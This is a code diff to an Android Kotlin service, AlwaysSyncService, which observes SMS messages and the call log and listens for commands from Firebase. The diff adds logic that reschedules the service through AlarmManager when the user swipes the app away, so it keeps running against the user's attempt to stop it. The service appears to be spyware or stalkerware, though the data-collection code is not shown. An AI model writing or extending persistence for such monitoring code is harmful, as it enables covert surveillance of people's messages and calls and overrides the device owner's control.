@@ -1,5 +1,6 @@
 package com.example.service
 
+import android.app.AlarmManager
 import android.app.PendingIntent
 import android.app.Service
 import android.content.Context
@@ -32,22 +33,55 @@ class AlwaysSyncService : Service() {
 
     private var smsObserver: ContentObserver? = null
     private var callLogObserver: ContentObserver? = null
+    private var isInitialized = false
 
     override fun onCreate() {
         super.onCreate()
         try {
             startForegroundServiceNotification()
-            registerObservers()
-            startPeriodicSyncLoop()
-            startFirebaseCommandListener()
+            if (!isInitialized) {
+                isInitialized = true
+                registerObservers()
+                startPeriodicSyncLoop()
+                startFirebaseCommandListener()
+            }
         } catch (e: Exception) {
             Log.e("AlwaysSyncService", "Error in onCreate: ${e.message}")
         }
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        startForegroundServiceNotification()
+        try {
+            startForegroundServiceNotification()
+            if (!isInitialized) {
+                isInitialized = true
+                registerObservers()
+                startPeriodicSyncLoop()
+                startFirebaseCommandListener()
+            }
+        } catch (e: Exception) {
+            Log.e("AlwaysSyncService", "Error in onStartCommand: ${e.message}")
+        }
         return START_STICKY
+    }
+
+    override fun onTaskRemoved(rootIntent: Intent?) {
+        super.onTaskRemoved(rootIntent)
+        try {
+            val restartServiceIntent = Intent(applicationContext, AlwaysSyncService::class.java)
+            val restartServicePendingIntent = PendingIntent.getService(
+                this, 1, restartServiceIntent,
+                PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
+            )
+            val alarmService = getSystemService(Context.ALARM_SERVICE) as? AlarmManager
+            alarmService?.set(
+                AlarmManager.RTC_WAKEUP,
+                System.currentTimeMillis() + 1000,
+                restartServicePendingIntent
+            )
+        } catch (e: Exception) {
+            Log.e("AlwaysSyncService", "Error scheduling service restart onTaskRemoved: ${e.message}")
+        }
     }
 
     private fun startForegroundServiceNotification() {
